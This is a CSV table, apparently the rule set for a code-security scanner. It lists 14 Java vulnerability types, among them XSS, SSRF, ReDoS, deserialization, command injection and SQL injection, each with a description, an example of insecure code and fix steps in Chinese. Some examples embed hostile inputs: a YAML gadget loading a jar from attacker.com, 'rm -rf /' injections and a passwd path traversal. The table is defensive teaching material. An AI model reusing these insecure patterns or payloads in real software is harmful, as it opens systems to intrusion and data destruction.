"id","name_CN","name_EN","level","function_name","description","example","repairPlan"
"1","跨站脚本：持久型","Cross-Site Scripting: Persistent","高危",,"持久型跨站脚本攻击（XSS）发生在攻击者将恶意脚本注入到目标网站的数据库中，当其他用户访问包含该恶意脚本的页面时，脚本会在用户的浏览器中执行。这种攻击通常发生在用户输入未经过滤或转义的情况下。","// 这是一个Servlet，处理用户评论并存储到数据库
public class CommentServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String comment = request.getParameter(""comment"");

        // 将评论存储到数据库（未进行任何转义或过滤）
        saveCommentToDatabase(comment);

        response.getWriter().write(""Comment saved!"");
    }

    private void saveCommentToDatabase(String comment) {
        // 模拟将评论存储到数据库
    }
}

// 在另一个Servlet中，从数据库读取评论并显示
public class DisplayCommentsServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String comments = getCommentsFromDatabase();

        // 直接将评论输出到页面，未进行转义
        response.getWriter().write(""<html><body>"" + comments + ""</body></html>"");
    }

    private String getCommentsFromDatabase() {
        // 模拟从数据库获取评论
        return ""<script>alert('XSS Attack!');</script>"";
    }
}","1.对用户输入进行严格的验证和过滤。
2.在输出时对特殊字符进行转义（如HTML实体编码）。
3.使用安全的API或库（如OWASP ESAPI）来处理用户输入。"
"2","日志伪造","Log Forging","中危","detect_log_forgery","攻击者通过注入伪造的日志条目（如换行符）来破坏日志文件的完整性，可能导致日志分析工具失效或掩盖攻击痕迹。","import java.util.logging.Logger;

public class LogForgeryExample {
    private static final Logger logger = Logger.getLogger(LogForgeryExample.class.getName());

    public static void main(String[] args) {
        String userInput = ""User logged in\n[INFO] User admin logged in"";

        // 直接将用户输入记录到日志中
        logger.info(""User action: "" + userInput);
    }
}","1.对日志内容进行严格的输入验证。
2.移除或转义换行符等特殊字符。
3.使用日志框架提供的安全方法。"
"3","服务器端请求伪造","Server-Side Request Forgery","高危","detect_ssrf","攻击者通过操纵服务器发起未经授权的请求，可能导致内部服务暴露、数据泄露或内部网络被攻击。","import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SSRFExample {
    public static void main(String[] args) throws Exception {
        String userInput = ""http://internal-server.local/secret"";

        // 用户控制的URL被直接用于发起请求
        URL url = new URL(userInput);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod(""GET"");

        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }
        in.close();

        System.out.println(content.toString());
    }
}","1.禁止用户直接控制请求的URL。
2.使用白名单机制限制允许访问的域名或IP。
3.对用户输入进行严格的验证和过滤。"
"4","拒绝服务：正则表达式","Denial of Service: Regular Expression","高危",,"正则表达式拒绝服务（ReDoS）发生在使用低效的正则表达式时，攻击者通过构造特定的输入使正则表达式引擎进入指数级计算，导致服务器资源耗尽。","public class ReDoSExample {
    public static void main(String[] args) {
        String userInput = ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"";

        // 使用一个容易受到ReDoS攻击的正则表达式
        String regex = ""^(a+)+$"";
        if (userInput.matches(regex)) {
            System.out.println(""Match found!"");
        } else {
            System.out.println(""No match."");
        }
    }
}","1.避免使用复杂的、嵌套的正则表达式。
2.使用更高效的正则表达式引擎或工具。
3.对用户输入进行长度限制。"
"5","HTTP响应拆分：Cookies","Header Manipulation: Cookies","高危",,"攻击者通过注入换行符（如\r\n）到HTTP头中，导致HTTP响应被拆分，可能用于注入恶意内容或发起进一步攻击。","import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class HttpResponseSplittingCookieExample extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String userInput = request.getParameter(""input"");

        // 直接将用户输入设置为Cookie值
        Cookie cookie = new Cookie(""user"", userInput);
        response.addCookie(cookie);

        response.getWriter().write(""Cookie set!"");
    }
}","1.对用户输入进行严格的验证和过滤。
2.移除或转义换行符等特殊字符。
3.使用安全的API设置HTTP头。"
"6","HTTP响应拆分","Header Manipulation","高危","detect_hrs","攻击者通过注入换行符（如\r\n）到HTTP响应头中，导致响应被拆分，可能用于注入恶意内容或发起进一步攻击。","import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class HttpResponseSplittingCookieExample extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String userInput = request.getParameter(""input"");

        // 直接将用户输入设置为Cookie值
        Cookie cookie = new Cookie(""user"", userInput);
        response.addCookie(cookie);

        response.getWriter().write(""Cookie set!"");
    }
}","1.对用户输入进行严格的验证和过滤。
2.移除或转义换行符等特殊字符。
3.使用安全的API设置HTTP头。"
"7","路径操纵","Path Manipulation","高危",,"攻击者通过操纵文件路径访问或修改未经授权的文件，可能导致敏感数据泄露或系统文件被破坏。","import java.io.File;
import java.io.IOException;

public class PathManipulationExample {
    public static void main(String[] args) {
        String userInput = ""../../etc/passwd""; // 恶意输入

        // 使用用户输入构造文件路径
        File file = new File(""/var/www/uploads/"" + userInput);

        // 尝试读取文件
        try {
            if (file.exists()) {
                System.out.println(""File exists: "" + file.getCanonicalPath());
            } else {
                System.out.println(""File does not exist."");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}","1.对用户输入进行严格的验证和过滤。
2.使用白名单机制限制允许访问的文件。
3.规范化文件路径并检查是否在允许的目录内。"
"8","动态解析代码：不安全的YAML反序列化","Dynamic Code Evaluation: Unsafe YAML Deserialization","高危",,"不安全的YAML反序列化漏洞发生在应用程序使用不受信任的YAML数据时，攻击者可以通过构造恶意YAML数据来执行任意代码或触发未预期的行为。","import org.yaml.snakeyaml.Yaml;
import java.io.InputStream;

public class UnsafeYamlDeserializationExample {
    public static void main(String[] args) {
        String maliciousYaml = ""!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader ""
                + ""[[!!java.net.URL [\""http://attacker.com/malicious.jar\""]]]]"";

        Yaml yaml = new Yaml();
        // 反序列化恶意YAML数据
        Object result = yaml.load(maliciousYaml);
        System.out.println(""Deserialized object: "" + result);
    }
}","1.使用安全的YAML解析器（如yaml.safe_load）。
2.避免直接反序列化不受信任的数据。
3.对输入数据进行严格的验证和过滤。"
"9","动态解析代码：脚本注入","Dynamic Code Evaluation: Script Injection","高危",,"脚本注入漏洞发生在应用程序动态执行用户提供的脚本代码时，攻击者可以通过注入恶意脚本来执行任意代码。","import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;

public class ScriptInjectionExample {
    public static void main(String[] args) {
        String userInput = ""java.lang.Runtime.getRuntime().exec('rm -rf /')""; // 恶意输入

        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName(""JavaScript"");

        try {
            // 执行用户提供的脚本
            engine.eval(userInput);
        } catch (ScriptException e) {
            e.printStackTrace();
        }
    }
}","1.避免直接执行用户提供的代码。
2.使用沙箱环境限制脚本的执行权限。
3.对输入数据进行严格的验证和过滤。"
"10","动态解析代码：不安全的JSON反序列化","Dynamic Code Evaluation: Unsafe JSON Deserialization","高危",,"不安全的JSON反序列化漏洞发生在应用程序使用不受信任的JSON数据时，攻击者可以通过构造恶意JSON数据来执行任意代码或触发未预期的行为。","import com.fasterxml.jackson.databind.ObjectMapper;

public class UnsafeJsonDeserializationExample {
    public static void main(String[] args) throws Exception {
        String maliciousJson = ""{\""@class\"":\""com.example.MaliciousClass\"",\""data\"":\""malicious\""}"";

        ObjectMapper mapper = new ObjectMapper();
        // 反序列化恶意JSON数据
        Object result = mapper.readValue(maliciousJson, Object.class);
        System.out.println(""Deserialized object: "" + result);
    }
}","1.使用安全的JSON解析器。
2.避免直接反序列化不受信任的数据。
3.对输入数据进行严格的验证和过滤。"
"11","动态解析代码：代码注入","Dynamic Code Evaluation: Code Injection","高危",,"代码注入漏洞发生在应用程序动态执行用户提供的代码时，攻击者可以通过注入恶意代码来执行任意命令。","import java.lang.reflect.Method;

public class CodeInjectionExample {
    public static void main(String[] args) throws Exception {
        String userInput = ""java.lang.Runtime.getRuntime().exec('calc.exe')""; // 恶意输入

        // 使用反射执行用户提供的代码
        Class<?> clazz = Class.forName(""java.lang.Runtime"");
        Method method = clazz.getMethod(""getRuntime"");
        Object runtime = method.invoke(null);
        Method execMethod = clazz.getMethod(""exec"", String.class);
        execMethod.invoke(runtime, userInput);
    }
}","1.避免直接执行用户提供的代码。
2.使用沙箱环境限制代码的执行权限。
3.对输入数据进行严格的验证和过滤。"
"12","动态解析代码：不安全的反序列化","Dynamic Code Evaluation: Unsafe Deserialization","高危",,"不安全的反序列化漏洞发生在应用程序使用不受信任的序列化数据时，攻击者可以通过构造恶意序列化数据来执行任意代码或触发未预期的行为。","import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

public class UnsafeDeserializationExample {
    public static void main(String[] args) throws Exception {
        // 模拟恶意序列化数据
        byte[] maliciousData = getMaliciousData();

        // 反序列化恶意数据
        ByteArrayInputStream bis = new ByteArrayInputStream(maliciousData);
        ObjectInputStream ois = new ObjectInputStream(bis);
        Object result = ois.readObject();
        System.out.println(""Deserialized object: "" + result);
    }

    private static byte[] getMaliciousData() {
        // 这里返回一个恶意序列化对象的字节数组
        return new byte[]{...}; // 恶意数据
    }
}","1.使用安全的反序列化方法。
2.避免直接反序列化不受信任的数据。
3.对输入数据进行严格的验证和过滤。"
"13","命令注入","Command Injection","高危","detect_Command_Injection","命令注入漏洞发生在应用程序将用户输入直接传递给系统命令时，攻击者可以通过注入恶意命令来执行任意系统命令。","import java.io.BufferedReader;
import java.io.InputStreamReader;

public class CommandInjectionExample {
    public static void main(String[] args) throws Exception {
        String userInput = ""; rm -rf /""; // 恶意输入

        // 将用户输入直接传递给系统命令
        Process process = Runtime.getRuntime().exec(""ls "" + userInput);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}","1.避免直接执行用户提供的命令。
2.使用安全的API或库来处理系统命令。
3.对输入数据进行严格的验证和过滤。"
"14","SQL注入","SQL Injection","高危","SQL_Injection","SQL注入漏洞发生在应用程序将用户输入直接拼接到SQL查询中时，攻击者可以通过注入恶意SQL代码来操纵数据库查询。","import java.sql.*;

public class SQLInjectionExample {
    public static void main(String[] args) {
        String userInput = args[0]; // 用户输入
        try {
            Connection conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydb"", ""user"", ""password"");
            Statement stmt = conn.createStatement();
            String query = ""SELECT * FROM users WHERE username = '"" + userInput + ""'""; // 直接拼接用户输入
            ResultSet rs = stmt.executeQuery(query);

            while (rs.next()) {
                System.out.println(rs.getString(""username""));
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
}","1.使用参数化查询或预编译语句。
2.对输入数据进行严格的验证和过滤。
3.使用ORM框架来避免直接编写SQL查询。"
